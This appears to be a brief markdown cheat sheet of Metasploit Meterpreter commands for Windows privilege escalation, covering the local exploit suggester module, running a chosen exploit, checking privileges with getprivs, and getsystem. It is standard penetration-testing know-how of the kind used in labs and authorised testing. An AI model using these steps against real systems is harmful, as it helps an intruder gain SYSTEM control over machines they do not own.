# Windows Privileges Escalation

## Meterpreter manual
```bash
run post/multi/recon/local_exploit_suggester
```

```bash
run path/to/exploit 
```
Notice that it isn't because the exploit doesn't escalate us to nt authority/ System that it hasn't wordked.  
Checks permissions with `getprivs`, some may have appeared

## Meterpreter auto
```bash
getsystem
```
Notice that sometimes, it will require some manual meterpreter privesc before to be able to escalate us to nt auhtority/system